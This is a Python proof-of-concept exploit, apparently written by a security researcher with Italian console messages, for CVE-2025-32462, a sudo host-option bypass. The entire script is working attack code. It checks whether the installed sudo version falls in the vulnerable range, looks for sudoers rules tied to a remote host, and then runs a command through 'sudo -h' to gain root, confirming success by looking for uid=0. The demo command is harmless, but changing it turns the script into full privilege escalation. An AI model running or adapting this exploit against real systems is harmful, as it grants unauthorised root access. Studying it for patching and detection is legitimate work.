# CVE-2025-32462 Sudo Host Bypass Exploit PoC
# This is for testing purposes.
# Author: Emanuele De Lucia.
# The author NOT responsible for any misuse.

import os
import subprocess
import re

CURRENT_USER = os.getenv("USER")
HOSTNAME = "ip_server"
COMMAND_TO_EXECUTE = "/usr/bin/id"

def check_sudo_version():
    try:
        result = subprocess.run(['sudo', '-V'], capture_output=True, text=True, check=True)
        version_output = result.stdout
        match = re.search(r'Sudo version (\d+\.\d+\.\d+p?\d*)', version_output)
        if not match:
            print("Impossibile determinare la versione.")
            return False, None

        version_str = match.group(1).replace('p', '.')
        version_tuple = tuple(map(int, version_str.split('.')))
        fix_version_p1 = (1, 9, 17, 1)

        print(f"Versione rilevata: {match.group(1)}")

        if (1, 8, 8) <= version_tuple < (1, 9, 17, 1):
             print("La versione è nell'intervallo vulnerabile.")
             return True, match.group(1)
        else:
            print("La versione non sembra essere vulnerabile.")
            return False, match.group(1)

    except (subprocess.CalledProcessError, FileNotFoundError) as e:
        print(f"Errore durante il controllo della versione: {e}")
        return False, None

def check_sudoers_misconfiguration():
    print(f"\nVerifica della configurazione di sudoers per l'utente...")
    try:
        cmd = ['sudo', '-l', '-h', HOSTNAME]
        result = subprocess.run(cmd, capture_output=True, text=True)
        if "User " + CURRENT_USER + " may run the following commands" in result.stdout and "not allowed" not in result.stderr:
            print(f"Trovata una regola sudoers per l'host '{HOSTNAME}'. Il sistema è probabilmente vulnerabile.")
            return True
        else:
            print("Nessuna regola sudoers sfruttabile trovata per un host remoto.")
            print("   Output di 'sudo -l':")
            print(result.stderr if result.stderr else result.stdout)
            return False

    except FileNotFoundError:
        print("Comando 'sudo' non trovato.")
        return False

def run_exploit():
    print(f"Tentativo di exploit per CVE-2025-32462...")
    print(f"Esecuzione del comando '{COMMAND_TO_EXECUTE}'")
    
    try:
        exploit_cmd = ['sudo', '-h', HOSTNAME, COMMAND_TO_EXECUTE]
        result = subprocess.run(exploit_cmd, capture_output=True, text=True, check=True)
        
        print("\nExploit riuscito!")
        print("Output del comando eseguito con privilegi elevati:")
        print("-" * 40)
        print(result.stdout)
        print("-" * 40)
        
        if "uid=0(root)" in result.stdout:
            print("Successo!")
        else:
            print("L'exploit è stato eseguito ma non sembra aver restituito i privilegi di root.")

    except subprocess.CalledProcessError as e:
        print("Exploit fallito.")
        print(f"Errore: {e.stderr}")
    except FileNotFoundError:
        print("Comando 'sudo' non trovato.")

if __name__ == "__main__":
    print("--- PoC per CVE-2025-32462: Sudo Host Bypass ---")
    
    is_vulnerable, _ = check_sudo_version()
    if not is_vulnerable:
        print("\nPoC terminato.")
    else:
        if check_sudoers_misconfiguration():
            run_exploit()
        else:
            print("\nIl sistema non presenta la configurazione errata necessaria per questo PoC.")
